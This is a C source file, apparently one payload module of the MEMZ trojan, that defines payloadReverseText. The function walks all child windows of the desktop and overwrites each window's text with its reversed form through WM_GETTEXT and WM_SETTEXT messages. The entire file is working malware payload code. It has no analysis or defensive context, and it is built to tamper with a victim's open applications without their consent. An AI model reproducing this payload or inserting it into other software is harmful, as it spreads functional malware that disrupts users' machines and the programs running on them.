#include "../MEMZ.h"

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);

PAYLOADFUNCTIONDEFAULT(payloadReverseText) {
	PAYLOADHEAD

	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

	out: return 50;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}
	
	GlobalFree(str);

	return TRUE;
}